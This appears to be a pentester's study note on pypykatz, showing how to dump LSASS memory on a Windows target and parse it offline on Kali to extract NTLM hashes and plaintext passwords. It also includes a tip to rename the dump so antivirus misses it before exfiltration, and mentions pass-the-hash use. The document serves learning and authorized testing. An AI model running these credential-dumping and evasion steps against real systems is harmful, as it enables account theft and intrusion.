# pypykatz

A Python-native reimplementation of Mimikatz's LSASS parsing logic. Runs on Kali (or any Python3 host) to extract credentials from an LSASS minidump file, no Windows or Mimikatz binary needed on the analyst's machine.

---

## What it replaces, and why it's faster

[[Password Attacks]] teaches Mimikatz on the target itself (`sekurlsa::logonpasswords`). When Mimikatz is AV-blocked, the workaround is to dump LSASS memory to a file on the target, exfiltrate the dump, and parse it offline. Traditionally this parsing required a Windows machine running Mimikatz. pypykatz does the same parsing on Kali, skipping the Windows intermediary entirely.

## Install

```bash
pip3 install pypykatz
# or
sudo apt install python3-pypykatz
```

## Usage

**Create the LSASS minidump on the target (Windows):**
```powershell
# Task Manager method: Details → right-click lsass.exe → "Create dump file"
# (saved to C:\Users\<user>\AppData\Local\Temp\lsass.DMP)

# Or via comsvcs.dll (admin cmd/PowerShell):
$lsasspid = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $lsasspid C:\Temp\lsass.dmp full
```

**Parse on Kali:**
```bash
# Full parse — shows all credential providers
pypykatz lsa minidump lsass.dmp

# JSON output for scripting
pypykatz lsa minidump lsass.dmp --json > creds.json

# Grep for specific fields
pypykatz lsa minidump lsass.dmp | grep -E "username|NT:|password"
```

**Output includes:**
- `NT:` → NTLM hash (crack with hashcat -m 1000 or pass directly)
- `password:` → wdigest plaintext (only present on older systems or if wdigest enabled)
- `username:` / `domain:` → account context

> 🔍 **Worth remembering:** the dump file itself is the sensitive artifact, not the parsing. Protect the `.dmp` file in transit, it's equivalent to an NTLM hash dump. AV may flag `lsass.dmp` by filename; rename it to something innocuous (e.g. `memory.bin`) before exfil.

## Where this applies in the vault

- [[Windows Methodology#Step 6: Offline Credential Dump Alternatives|Windows Methodology, Phase 2.5 Step 6]]
- [[Password Attacks (HTB Supplementary)#PA.9 pypykatz lsa minidump|PA.9]]

🔁 [[Password Attacks (HTB Supplementary)#PA.9|PA.9]], [[NetExec]] (alternative remote dump approach)

#### Tags: #ModernTooling #pypykatz #LSASS #Mimikatz #CredentialDump #OfflineParsing
